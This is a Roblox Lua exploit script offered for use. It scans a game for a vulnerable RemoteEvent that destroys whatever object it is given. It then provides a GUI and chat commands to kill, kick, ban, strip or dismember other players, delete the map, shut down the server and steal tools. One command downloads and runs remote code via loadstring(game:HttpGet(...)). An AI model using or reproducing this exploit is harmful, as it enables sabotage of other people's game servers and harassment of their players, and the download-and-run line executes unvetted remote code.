-- join our discord server
-- https://discord.gg/HjZKVFk2ue
local version = "2.3"
local fe = string.reverse("eu2kFVKZjH/gg.drocsid")

local StarterGui = game:GetService("StarterGui")
local showNotification = true

function Notify(tl, t, d) 
if showNotification == true then
StarterGui:SetCore("SendNotification", {
	Title = tl;
	Text = t;
	Duration = d;
})
end
end

if game.CoreGui:FindFirstChild("destruct") then
game.CoreGui.destruct:Destroy()
end

local BlurFX = Instance.new("BlurEffect")
BlurFX.Size = 0
BlurFX.Name = "Blur"
BlurFX.Parent = workspace.CurrentCamera

local function blurefct(siz)
local TweenService = game:GetService("TweenService")
local goal = {}
goal.Size = siz

local tweenInfo = TweenInfo.new(2)
local tween = TweenService:Create(BlurFX, tweenInfo, goal)

tween:Play()
end

local remote = "nil"
local found = false
local enable = false
local sent = false
local LocalPlayer = game:GetService("Players").LocalPlayer
local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()

local checkIn = {"Workspace", "ReplicatedStorage"}

local receiver = Instance.new("BindableFunction")
receiver.OnInvoke = function(btn) 
if btn == "Match" then
local names = {"Delete", "Remove", "Destroy", "Clean", "Clear","Bullet", "Bala", "Shoot", "Shot", "Fire", "Segway", "Handless", "Sword", "Attack", "Despawn", "Unspawn", "Deletar", "Apagar"}
if char then
blurefct(20)
Notify("Vulnerability Checker", "Looking up for remotes, may take a while.", 3)
for _, service in pairs(checkIn) do
for i,v in pairs(game:GetService(service):GetDescendants()) do
for _, str in pairs(names) do
if string.match(v.Name, str) and v:IsA("RemoteEvent") then
print("Checking " .. v.Name .. " from " .. service .. " service from " .. str .. " category")
local success, error = pcall(function()
v:FireServer(char["Body Colors"])
found = true
end)
if success then
remote = v
end 
wait(0.5)
if not char:FindFirstChild("Body Colors") then
enable = true
sent = true
break
end
end
end
end
end
end

if sent == false then
Notify("Vulnerability Checker", "This game is not vulnerable/supported.", 5)
blurefct(0)
else
load()
end

elseif btn == "All" then
if char then
blurefct(20)
Notify("Vulnerability Checker", "Looking up for remotes, may take a while.", 3)
for _, service in pairs(checkIn) do
for i,v in pairs(game:GetService(service):GetDescendants()) do
if v:IsA("RemoteEvent") then
print("Checking " .. v.Name .. " from " .. service .. " service")
local success, error = pcall(function()
v:FireServer(char["Body Colors"])
found = true
end)
if success then
remote = v
end 
wait(0.5)
if not char:FindFirstChild("Body Colors") then
sent = true
break
end
end
end
end
end

if sent == false then
Notify("Vulnerability Checker", "This game is not vulnerable/supported.", 5)
blurefct(0)
else
load()
end
end
end

StarterGui:SetCore("SendNotification", {
	Title = "Vuln Scanner";
	Text = "Please select the scan method.";
	Duration = 100;
	Button1 = "All";
	Button2 = "Match";
	Callback = receiver;
})

function work(arg1)
remote:FireServer(arg1)
end

function GetPlayer(String)
   local Found = {}
   local strl = String:lower()
   if strl == "all" then
       for i,v in pairs(game.Players:GetPlayers()) do
           table.insert(Found,v.Name)
       end
   elseif strl == "others" then
       for i,v in pairs(game.Players:GetPlayers()) do
           if v.DisplayName ~= game.Players.LocalPlayer.DisplayName then
               table.insert(Found,v.Name)
           end
       end  
elseif strl == "me" then
       for i,v in pairs(game.Players:GetPlayers()) do
           if v.DisplayName == game.Players.LocalPlayer.DisplayName then
               table.insert(Found,v.Name)
           end
       end  
   else
       for i,v in pairs(game.Players:GetPlayers()) do
           if v.DisplayName:lower():sub(1, #String) == String:lower() then
               table.insert(Found,v.Name)
           end
       end    
   end
   return Found    
end

function load()
if game.CoreGui:FindFirstChild("destruct") then
game.CoreGui.destruct:Destroy()
end
if enable == true then
Notify("Destructed Hex", "Commands: 011_luq & UI: awtch", 5)
blurefct(0)
print("Using " .. remote.Name)
local destruct = Instance.new("ScreenGui")
local main = Instance.new("Frame")
local TextLabel = Instance.new("TextLabel")
local line = Instance.new("Frame")
local ImageLabel = Instance.new("ImageLabel")
local scripts = Instance.new("ScrollingFrame")
local banland = Instance.new("TextLabel")
local UIGridLayout = Instance.new("UIGridLayout")
local player = Instance.new("TextBox")

destruct.Name = "destruct"
destruct.Parent = game.CoreGui
destruct.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

main.Name = "main"
main.Parent = destruct
main.BackgroundColor3 = Color3.fromRGB(76, 76, 76)
main.BackgroundTransparency = 0.3
main.BorderSizePixel = 0
main.Position = UDim2.new(0.268847764, 0, 0.372854918, 0)
main.Size = UDim2.new(0, 325, 0, 270)
main.Active = true

player.Name = "player"
player.Parent = main
player.BackgroundColor3 = Color3.fromRGB(85, 85, 85)
player.BorderSizePixel = 0
player.Position = UDim2.new(0.0246153846, 0, 0.870292902, 0)
player.Size = UDim2.new(0, 310, 0, 23)
player.ClearTextOnFocus = false
player.Font = Enum.Font.SourceSans
player.PlaceholderColor3 = Color3.fromRGB(152, 152, 152)
player.PlaceholderText = "PLAYER"
player.Text = ""
player.TextColor3 = Color3.fromRGB(255, 255, 255)
player.TextSize = 14.000

local UserInputService = game:GetService("UserInputService")

local gui = main

local dragging
local dragInput
local dragStart
local startPos

local function update(input)
	local delta = input.Position - dragStart
	gui:TweenPosition(UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y), Enum.EasingDirection.InOut, Enum.EasingStyle.Sine, 0.05, true)
end

gui.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		dragging = true
		dragStart = input.Position
		startPos = gui.Position

		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then
				dragging = false
			end
		end)
	end
end)

gui.InputChanged:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
		dragInput = input
	end
end)

UserInputService.InputChanged:Connect(function(input)
	if input == dragInput and dragging then
		update(input)
	end
end)

TextLabel.Parent = main
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.BorderSizePixel = 0
TextLabel.Position = UDim2.new(0.292307675, 0, 0, 0)
TextLabel.Size = UDim2.new(0, 134, 0, 25)
TextLabel.Font = Enum.Font.Roboto
TextLabel.Text = "Destructed_Hex's GUI"
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextSize = 17.000

line.Name = "line"
line.Parent = main
line.BackgroundColor3 = Color3.fromRGB(84, 84, 84)
line.BorderSizePixel = 0
line.Position = UDim2.new(0, 0, 0.106986806, 0)
line.Size = UDim2.new(0, 325, 0, 6)

ImageLabel.Parent = main
ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageLabel.BackgroundTransparency = 1.000
ImageLabel.BorderSizePixel = 0
ImageLabel.Position = UDim2.new(0.184615389, 0, 0, 0)
ImageLabel.Size = UDim2.new(0, 25, 0, 25)
ImageLabel.Image = "http://www.roblox.com/asset/?id=8388262491"
ImageLabel.ScaleType = Enum.ScaleType.Fit

scripts.Name = "scripts"
scripts.Parent = main
scripts.Active = true
scripts.BackgroundColor3 = Color3.fromRGB(63, 63, 63)
scripts.BackgroundTransparency = 1
scripts.BorderSizePixel = 0
scripts.Position = UDim2.new(0, 0, 0.134782612, 0)
scripts.Size = UDim2.new(0, 325, 0, 173)
scripts.CanvasSize = UDim2.new(0, 0, 1.29, 0)
scripts.ScrollBarThickness = 0

banland.Parent = main
banland.BackgroundColor3 = Color3.fromRGB(120,120,120)
banland.BackgroundTransparency = 1
banland.BorderSizePixel = 0
banland.Position = UDim2.new(0, 0, 0.779999971, 0)
banland.Size = UDim2.new(0, 325, 0, 25)
banland.Font = Enum.Font.Roboto
banland.TextColor3 = Color3.fromRGB(152, 152, 152)
banland.TextSize = 1.000
banland.TextScaled = true

UIGridLayout.Parent = scripts
UIGridLayout.SortOrder = Enum.SortOrder.LayoutOrder
UIGridLayout.CellSize = UDim2.new(0, 104, 0, 30)

local commands = {}
local count = 0

local function AddCommand(nm, func)
count = count + 1

btn = Instance.new("TextButton")
btn.Name = nm
btn.Parent = scripts
btn.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
btn.BorderSizePixel = 0
btn.Size = UDim2.new(0, 200, 0, 50)
btn.Font = Enum.Font.Roboto
btn.Text = nm
btn.TextColor3 = Color3.fromRGB(255, 255, 255)
btn.TextSize = 14.000

commands[nm:lower()] = func

btn.MouseButton1Click:Connect(function()
func()
end)
end

local function ExecuteCommand(Name)
	Name = Name:lower()
	for i,Command in pairs(string.split(Name, ",")) do
		local Args = Command:split(" ")
		if commands[Args[1]] then
		    player.Text = Args[2]
			commands[Args[1]](Args)
		end
	end
end

local bannedPlayers = {}
local admins = {}
local serverlock = false
local sdown = false
local cam = workspace.CurrentCamera
prefix = ":"

function GetAPlayer(String)
   local Found = {}
   local strl = String:lower()
   for i,v in pairs(game.Players:GetPlayers()) do
   if v.Name:lower():sub(1, #String) == String:lower() then
               table.insert(Found,v.Name)
   end 
   end
   return Found    
end

table.insert(admins, LocalPlayer.Name)

function rankAdmin(boy)
if boy ~= LocalPlayer.Name then
table.insert(admins, boy)
Notify("Destructed Admin", "Ranked "..boy.." as an Admin", 5)
send = {
    [1] = "/w "..boy.." You have been ranked as an Admin",
    [2] = "All"
}
prf = {
    [1] = "/w "..boy.." Prefix: '"..prefix.."'",
    [2] = "All"
}
game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer(unpack(send))
game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer(unpack(prf))
end
end

function rankAll()
Notify("Destructed Admin", "Everyone can now use Admin Commands", 5)
one = {
    [1] = "Ranked all players as an Admin",
    [2] = "All"
}
two = {
    [1] = "Prefix: '"..prefix.."'",
    [2] = "All"
}
game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer(unpack(one))
game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer(unpack(two))
for i, v in pairs(game:GetService("Players"):GetPlayers()) do
spawn(function()
if not table.find(admins, v.Name) then
table.insert(admins, v.Name)
end
end)
end
end
	
function unrank(boy)
if boy ~= LocalPlayer.Name then
table.remove(admins, table.find(admins, boy))
Notify("Destructed Admin", "Unranked "..boy, 5)
end
end

function GetBannedPlayer(target)
local Found = {}
string = target:lower()
for _, str in pairs(bannedPlayers) do
if str:lower():sub(1, #string) == string:lower() then
table.insert(Found, str)
break
end
end
return Found
end

if game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents") then
game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.OnMessageDoneFiltering.OnClientEvent:Connect(function(messageData)
for _, adm in pairs(admins) do
if adm:find(messageData.FromSpeaker) then
Message = messageData.Message:gsub("/e ", "")
	if string.sub(Message, 1, 1) == prefix then
		Message = Message:gsub(prefix, "")
		ExecuteCommand(Message)
	end
end
end
end)
else
Notify("Destructed Admin", "We couldn't load DAdmin because the game is using the new chat system", 5)
end

game:GetService("Players").PlayerAdded:Connect(function(plr)
for i,v in pairs(bannedPlayers) do
if plr.DisplayName == v then
Notify("Banned User", plr.Name .. " Tried to join the game", 5)
work(plr)
end
end
if serverlock == true then
Notify("Join Attempt", plr.Name .. " Tried to join the game but the server is locked", 5)
work(plr)
end
if sdown == true then
work(plr)
end
end)

AddCommand("Kill", function()
for i,v in pairs(GetPlayer(player.Text)) do
            task.spawn(function()
            if game:GetService("Players")[v].Character.Humanoid.RigType == Enum.HumanoidRigType.R6 then
            work(game:GetService("Players")[v].Character.Torso.Neck)
            else
            work(game:GetService("Players")[v].Character.Head.Neck)
            end
end)
end
end)

AddCommand("Naked", function()
for i,v in pairs(GetPlayer(player.Text)) do
if game:GetService("Players")[v].Character:FindFirstChildOfClass("Shirt") then
task.spawn(function()
work(game:GetService("Players")[v].Character:FindFirstChildOfClass("Shirt"))
end)
end
if game:GetService("Players")[v].Character:FindFirstChildOfClass("Pants") then
task.spawn(function()
work(game:GetService("Players")[v].Character:FindFirstChildOfClass("Pants"))
end)
end
if game:GetService("Players")[v].Character:FindFirstChild("Shirt Graphic") then
task.spawn(function()
work(game:GetService("Players")[v].Character:FindFirstChild("Shirt Graphic"))
end)
end
end
end)

AddCommand("Btools", function()
local Tool = Instance.new("Tool",game.Players.LocalPlayer.Backpack)
local Equipped = false

Tool.RequiresHandle = false
Tool.Name = "Destroy Tool"
local Field = Instance.new("SelectionBox",game.Workspace)
local Mouse = game.Players.LocalPlayer:GetMouse()
Field.LineThickness = 0.1
Tool.TextureId = "http://www.roblox.com/asset/?id=12223874"
Tool.Equipped:Connect(function()
Equipped = true

while Equipped == true do
if Mouse.Target ~= nil then
Field.Adornee = Mouse.Target
Mouse.Icon = "rbxasset://textures/HammerCursor.png"
else
Field.Adornee = nil
Mouse.Icon = ""
end
wait()
end
end)


Tool.Unequipped:Connect(function()
Equipped = false
Field.Adornee = nil
Mouse.Icon = ""
end)

Tool.Activated:Connect(function()
if Mouse.Target ~= nil then
print(Mouse.Target)
remote:FireServer(Mouse.Target, {Value = Mouse.Target})
local ex = Instance.new'Explosion'
ex.BlastRadius = 0
ex.Position = Mouse.Target.Position
ex.Parent = workspace

local AttemptTarget = Mouse.Target
while AttemptTarget ~= nil do
AttemptTarget.Velocity = Vector3.new(0,-1000000000000000,0)
AttemptTarget.CanCollide = false
wait()
end
end
end)
end)

AddCommand("RemoveAnims", function()
for i,v in pairs(GetPlayer(player.Text)) do
if game:GetService("Players")[v].Character:FindFirstChild("Humanoid") then
work(game:GetService("Players")[v].Character.Humanoid:FindFirstChild("Animator"))
end
end
end)

AddCommand("NoLimbs", function()
for i,v in pairs(GetPlayer(player.Text)) do
task.spawn(function()
if game:GetService("Players")[v].Character.Humanoid.RigType == Enum.HumanoidRigType.R6 then
names = {"Left Arm", "Right Arm", "Left Leg", "Right Leg"}
for _, str in pairs(names) do
work(game:GetService("Players")[v].Character[str])
end
else
names = {"LeftUpperArm", "RightUpperArm", "LeftUpperLeg", "RightUpperLeg"}
for _, str in pairs(names) do
work(game:GetService("Players")[v].Character[str])
end
end
end)
end
end)

AddCommand("Kick", function()
for i,v in pairs(GetPlayer(player.Text)) do
task.spawn(function()
work(game:GetService("Players")[v])
end)
end
end)

AddCommand("Nuke", function()
for i,c in pairs(game.Workspace:GetChildren()) do
        work(c)
end
end)

AddCommand("Ban", function()
for i,v in pairs(GetPlayer(player.Text)) do
task.spawn(function()
if not table.find(bannedPlayers, v) then
plr = game:GetService("Players")[v]
table.insert(bannedPlayers, plr.DisplayName)
work(plr)
end
end)
end
end)

AddCommand("UnBan", function()
if not player.Text == "all" or not player.Text == "others" then
for i,v in pairs(GetBannedPlayer(player.Text)) do
task.spawn(function()
table.remove(bannedPlayers, table.find(bannedPlayers, v))
end)
end
else
table.clear(bannedPlayers)
Notify("Unbanned", "All players were unbanned.", 5)
end
end)

AddCommand("Goto", function()
for i,v in pairs(GetPlayer(player.Text)) do
LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v].Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, -5)
end
end)

AddCommand("Sink", function()
for i,v in pairs(GetPlayer(player.Text)) do
task.spawn(function()
destr = game:GetService("Players")[v].Character["HumanoidRootPart"]
work(destr)
end)
end
end)

AddCommand("Faceless", function()
for i,v in pairs(GetPlayer(player.Text)) do
task.spawn(function()
work(game:GetService("Players")[v].Character.Head.face)
end)
end
end)

AddCommand("Hatless", function()
for i, v in pairs(GetPlayer(player.Text)) do
for i, h in pairs(game:GetService("Players")[v].Character:GetChildren()) do
if h:IsA("Accessory") then
work(h)
end
end
end
end)

AddCommand("Ragdoll", function()
for i,v in pairs(GetPlayer(player.Text)) do
task.spawn(function()
e = game:GetService("Players")[v].Character:FindFirstChild("Humanoid")
work(e)
end)
end
end)

AddCommand("Admin", function()
if player.Text == "all" or player.Text == "others" or player.Text == "" then
rankAll()
else
for i,v in pairs(GetAPlayer(player.Text)) do
if not table.find(admins, v) then
rankAdmin(v)
end
end
end
end)

AddCommand("UnAdmin", function()
for i,v in pairs(GetPlayer(player.Text)) do
if table.find(admins, v) then
unrank(v)
end
end
end)

local toggle = false

AddCommand("ServerLock", function()
if toggle == false then
game.CoreGui.destruct.main.scripts.ServerLock.Text = "UnServerLock"
Notify("Server Locked", "Nobody can join the server", 5)
serverlock = true
toggle = true
elseif toggle == true then
game.CoreGui.destruct.main.scripts.ServerLock.Text = "ServerLock"
Notify("Server Unlocked", "Anyone can join the server", 5)
serverlock = false
toggle = false
end
end)

AddCommand("Freeze", function()
for i,v in pairs(GetPlayer(player.Text)) do
task.spawn(function()
work(game:GetService("Players")[v].Character.HumanoidRootPart)
work(game:GetService("Players")[v].Character.Humanoid:FindFirstChild("Animator"))
end)
end
end)

AddCommand("DisableChat", function()
if game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents") then
work(game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents)
else
work(game:GetService("TextChatService").TextChannels)
end
end)

AddCommand("Giant", function()
for i,v in pairs(GetPlayer(player.Text)) do
task.spawn(function()
local plr = game:GetService("Players")[v]
local Character = plr.Character
local Humanoid = Character:FindFirstChildOfClass("Humanoid")

function rm()
    for i,v in pairs(Character:GetDescendants()) do
        if v:IsA("BasePart") then
            if v.Name == "Handle" or v.Name == "Head" then
                if Character.Head:FindFirstChild("OriginalSize") then
                    work(Character.Head.OriginalSize)
                end
            else
                for i,cav in pairs(v:GetDescendants()) do
                    if cav:IsA("Attachment") then
                        if cav:FindFirstChild("OriginalPosition") then
                            work(cav.OriginalPosition)
                        end
                    end
                end
                work(v:FindFirstChild("OriginalSize"))
                if v:FindFirstChild("AvatarPartScaleType") then
                    work(v:FindFirstChild("AvatarPartScaleType"))
                end
            end
        end
    end
end

rm()

wait(0.5)

work(Humanoid:FindFirstChild("BodyProportionScale"))

wait(1)

rm()

wait(0.5)

work(Humanoid:FindFirstChild("BodyHeightScale"))

wait(1)

rm()

wait(0.5)

work(Humanoid:FindFirstChild("BodyWidthScale"))

wait(1)

rm()

wait(0.5)

work(Humanoid:FindFirstChild("BodyDepthScale"))

wait(1)

rm()

wait()

wait(0.5)
work(Humanoid:FindFirstChild("HeadScale"))
end)
end
end)

AddCommand("View", function()
for i, v in pairs(GetPlayer(player.Text)) do
if game:GetService("Players")[v].Character:FindFirstChild("Humanoid") then
cam.CameraSubject = game:GetService("Players")[v].Character.Humanoid
end
end
end)

AddCommand("UnView", function()
if LocalPlayer.Character:FindFirstChild("Humanoid") then
cam.CameraSubject = LocalPlayer.Character.Humanoid
end
end)

AddCommand("Shutdown", function()
sdown = true
Notify("Shutdown", "Shutdowning server..", 5)
for i, v in pairs(game:GetService("Players"):GetPlayers()) do
task.spawn(function()
if v.Name ~= LocalPlayer.Name then
work(v)
repeat wait() until not game:GetService("Players"):FindFirstChild(v)
work(LocalPlayer)
end
end)
end
end)

AddCommand("RemoveTools", function()
for i,v in pairs(GetPlayer(player.Text)) do
task.spawn(function()
backpack = game:GetService("Players")[v]["Backpack"] or game:GetService("Players")[v]:WaitForChild("Backpack")
for i,t in pairs(backpack:GetChildren()) do
if t:IsA("BackpackItem") and t:FindFirstChild("Handle") then
work(t)
end
end
end)
end
end)

AddCommand("StealTools", function()
for i,v in pairs(GetPlayer(player.Text)) do
task.spawn(function()
work(game:GetService("Players")[v].Character:FindFirstChildOfClass("Humanoid"))
repeat wait() until game:GetService("Players")[v].Character:FindFirstChildOfClass("Humanoid").Parent == nil
for i,v in pairs(game:GetService("Players")[v].Character:GetChildren()) do
if v:IsA("BackpackItem") and v:FindFirstChild("Handle") then
LocalPlayer.Character:WaitForChild("Humanoid"):EquipTool(v)
end
end
end)
end
end)

AddCommand("Punish", function()
for i,v in pairs(GetPlayer(player.Text)) do
            task.spawn(function()
            work(game:GetService("Players")[v].Character)
end)
end
end)

AddCommand("DeleteMap", function()
for i, v in pairs(game:GetService("Workspace"):GetChildren()) do
if not game:GetService("Players"):GetPlayerFromCharacter(v) then
work(v)
end
end
end)

AddCommand("RemoveSeats", function()
for i, v in pairs(game:GetService("Workspace"):GetDescendants()) do
if v:IsA("VehicleSeat") or v:IsA("Seat") then
work(v)
end
end
end)

AddCommand("BlockHead", function()
for i,v in pairs(GetPlayer(player.Text)) do
if game:GetService("Players")[v].Character.Head:FindFirstChild("Mesh") then
work(game:GetService("Players")[v].Character.Head.Mesh)
end
end
end)

AddCommand("Explorer", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/itzyaboyluq/destructedhex/main/explorer.lua"))()
end)

while wait(0.25) do
banland.Text = "Banland: "..table.concat(bannedPlayers, ", ")
end
end
end

-- GUI, Scripts/Commands by Luca and luq.